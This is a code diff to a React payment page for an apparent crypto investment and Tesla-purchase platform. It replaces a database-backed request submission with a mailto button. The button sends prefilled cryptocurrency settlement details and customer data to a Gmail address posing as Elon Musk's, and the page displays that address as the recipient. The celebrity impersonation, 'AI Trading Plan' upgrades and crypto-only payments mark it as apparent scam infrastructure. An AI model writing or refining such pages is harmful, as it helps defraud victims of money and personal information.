@@ -4,7 +4,6 @@ import {
   AlertCircle,
   Loader2,
   ArrowLeft,
-  Send,
   Copy,
   Check,
   LayoutDashboard,
@@ -22,16 +21,6 @@ import {
   getPaymentRequestContext,
   savePaymentRequestContext
 } from '../lib/paymentContext';
-import {
-  submitDepositRequest,
-  submitWithdrawalRequest,
-  submitPlanUpgradeRequest,
-  submitMembershipUpgradeRequest,
-  submitVehiclePurchaseRequest,
-  submitInvestmentRequest,
-  submitVehicleCashOutRequest,
-  type PaymentRequestResult
-} from '../lib/paymentRequests';
 import { supabase } from '../lib/supabase';
 import { navigate } from '../lib/navigation';
 import { PageTransition, Reveal, MotionCard } from './MotionSystem';
@@ -196,119 +185,10 @@ export const PaymentPage: React.FC = () => {
     }
   };
 
-  const handleConfirmSubmit = async () => {
-    if (!context || !user || context.is_submitted || isSubmitting) return;
-
-    setIsSubmitting(true);
-    setErrorMessage(null);
-
-    let result: PaymentRequestResult;
-
-    try {
-      switch (context.request_type) {
-        case 'deposit':
-          result = await submitDepositRequest({
-            amount: context.amount,
-            currency: context.currency || 'USD',
-            paymentMethod: 'Cryptocurrency',
-            notes: context.notes,
-          });
-          break;
-
-        case 'withdrawal':
-          result = await submitWithdrawalRequest({
-            amount: context.amount,
-            currency: context.currency || 'USD',
-            assetName: context.asset_name || context.item_name || 'Account Available Balance',
-            notes: context.notes,
-          });
-          break;
-
-        case 'plan_upgrade':
-          result = await submitPlanUpgradeRequest({
-            planId: context.plan_id || 'starter-ai',
-            planName: context.plan_name || context.item_name || 'AI Trading Plan',
-            price: context.amount,
-            notes: context.notes,
-          });
-          break;
-
-        case 'membership_upgrade':
-          result = await submitMembershipUpgradeRequest({
-            tierId: context.tier_id || '',
-            tierName: context.tier_name || context.item_name || 'Membership Tier',
-            price: context.amount,
-            notes: context.notes,
-          });
-          break;
-
-        case 'vehicle_purchase':
-          result = await submitVehiclePurchaseRequest({
-            vehicleId: context.vehicle_id || '',
-            vehicleName: context.vehicle_name || context.item_name || 'Tesla Vehicle',
-            paymentOption: context.payment_option || 'part',
-            fullPrice: context.full_price || context.amount,
-            partPaymentAmount: context.part_payment_amount || 5000,
-            quantity: context.quantity || 1,
-            notes: context.notes,
-          });
-          break;
-
-        case 'investment':
-          result = await submitInvestmentRequest({
-            projectId: context.project_id || '',
-            projectName: context.project_name || context.item_name || 'Investment Project',
-            amount: context.amount,
-            currency: context.currency || 'USD',
-            notes: context.notes,
-          });
-          break;
-
-        case 'cash_out':
-          result = await submitVehicleCashOutRequest({
-            orderId: context.order_id,
-            vehicleName: context.vehicle_name || context.item_name || 'Vehicle Cash Out',
-            amount: context.amount,
-            currency: context.currency || 'USD',
-            reason: context.reason,
-          });
-          break;
-
-        default:
-          result = await submitDepositRequest({
-            amount: context.amount,
-            currency: context.currency || 'USD',
-            paymentMethod: 'Cryptocurrency',
-            notes: context.notes,
-          });
-      }
-
-      if (result.success) {
-        const updatedContext: PaymentRequestContext = {
-          ...context,
-          request_id: result.requestId || context.request_id,
-          reference_id: result.referenceId || context.reference_id,
-          status: result.status,
-          is_submitted: true,
-          payment_method: 'Cryptocurrency',
-        };
-        setContext(updatedContext);
-        savePaymentRequestContext(updatedContext);
-      } else {
-        setErrorMessage(result.message || 'Failed to submit payment request.');
-      }
-    } catch (err: any) {
-      console.error('Error submitting payment request:', err);
-      setErrorMessage(err?.message || 'An unexpected error occurred while submitting your request.');
-    } finally {
-      setIsSubmitting(false);
-    }
-  };
-
-  const getEmailMailtoUrl = () => {
+  const getEmailMailtoUrl = (methodName: string = 'Email') => {
     if (!context) return '#';
 
-    const recipient = 'elonmusk2580800@gmail.com';
+    const recipient = 'elonmusk258080@gmail.com';
     const subject = encodeURIComponent(`[Payment Request] ${context.request_type.toUpperCase()} - Ref: ${context.reference_id}`);
 
     const bodyText = `
@@ -322,6 +202,7 @@ I would like to process my payment request with the following details:
 - Item / Service: ${context.item_name || context.vehicle_name || context.plan_name || context.project_name || 'N/A'}
 ${context.quantity ? `- Quantity: ${context.quantity}\n` : ''}
 ${context.payment_option ? `- Payment Option: ${context.payment_option}\n` : ''}
+- Settlement Method: ${methodName}
 - Customer Name: ${context.customer_name || (profile?.first_name ? `${profile?.first_name || ''} ${profile?.last_name || ''}`.trim() : user?.email || 'N/A')}
 - Customer Email: ${user?.email || 'N/A'}
 ${context.notes ? `- Customer Notes: ${context.notes}\n` : ''}
@@ -670,58 +551,23 @@ Thank you!
                       </div>
                     </div>
 
+                    <div className="flex justify-between items-center pb-2 border-b border-white/10">
+                      <span className="text-white/40 text-[10px] uppercase">Recipient:</span>
+                      <span className="text-emerald-300 font-bold truncate">elonmusk258080@gmail.com</span>
+                    </div>
+
                     <div className="p-3 rounded-lg bg-white/[0.03] border border-white/5 text-[10px] text-white/50 leading-relaxed font-sans">
-                      <strong>Instruction Notice:</strong> Payment details above represent configured settlement protocols for reference <strong>{context.reference_id}</strong>. Confirm your request below to record your order in your database account ledger.
+                      <strong>Instruction Notice:</strong> Payment details above represent configured settlement protocols for reference <strong>{context.reference_id}</strong>. Clicking below will open your default email application with prefilled cryptocurrency settlement details.
                     </div>
                   </div>
 
-                  {context.is_submitted ? (
-                    <div className="space-y-4">
-                      <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-xs text-emerald-400 space-y-2">
-                        <div className="flex items-center gap-2 font-bold uppercase">
-                          <CheckCircle2 className="w-4 h-4" />
-                          Request Recorded &amp; Submitted
-                        </div>
-                        <p className="text-emerald-300/80 font-light leading-relaxed">
-                          Your request has been logged under reference <strong>{context.reference_id}</strong>. Administrative review is in progress.
-                        </p>
-                      </div>
-
-                      <button
-                        type="button"
-                        onClick={() => navigate('/dashboard')}
-                        className="w-full py-3.5 rounded-full bg-white/10 hover:bg-white/20 text-white text-xs font-bold uppercase tracking-wider transition-colors border border-white/15 flex items-center justify-center gap-2 cursor-pointer"
-                      >
-                        <LayoutDashboard className="w-4 h-4" />
-                        Return to Dashboard
-                      </button>
-                    </div>
-                  ) : (
-                    <div className="space-y-4 pt-2">
-                      <p className="text-[11px] text-white/50 leading-relaxed font-light">
-                        Click below to confirm and submit your request. Your request will be recorded under <strong>PENDING REVIEW</strong> status in your database account ledger.
-                      </p>
-
-                      <button
-                        type="button"
-                        onClick={handleConfirmSubmit}
-                        disabled={isSubmitting}
-                        className="w-full py-4 bg-red-600 hover:bg-red-500 text-white text-xs font-bold uppercase tracking-[0.15em] rounded-full transition-all duration-300 shadow-[0_0_20px_rgba(232,33,39,0.3)] flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
-                      >
-                        {isSubmitting ? (
-                          <>
-                            <Loader2 className="w-4 h-4 animate-spin" />
-                            Submitting Request...
-                          </>
-                        ) : (
-                          <>
-                            <Send className="w-4 h-4" />
-                            Confirm &amp; Submit Request
-                          </>
-                        )}
-                      </button>
-                    </div>
-                  )}
+                  <a
+                    href={getEmailMailtoUrl('Cryptocurrency')}
+                    className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold uppercase tracking-[0.15em] rounded-full transition-all duration-300 shadow-[0_0_20px_rgba(16,185,129,0.3)] flex items-center justify-center gap-2 cursor-pointer no-underline text-center block"
+                  >
+                    <Mail className="w-4 h-4 inline" />
+                    <span>Open Email Client</span>
+                  </a>
                 </div>
               )}
 
@@ -895,7 +741,7 @@ Thank you!
                   <div className="p-4 rounded-xl bg-purple-500/5 border border-purple-500/20 space-y-3 text-xs font-mono">
                     <div className="flex justify-between items-center pb-2 border-b border-white/10">
                       <span className="text-white/40 text-[10px] uppercase">Recipient:</span>
-                      <span className="text-purple-300 font-bold truncate">elonmusk2580800@gmail.com</span>
+                      <span className="text-purple-300 font-bold truncate">elonmusk258080@gmail.com</span>
                     </div>
                     <div className="flex justify-between items-center pb-2 border-b border-white/10">
                       <span className="text-white/40 text-[10px] uppercase">Subject:</span>
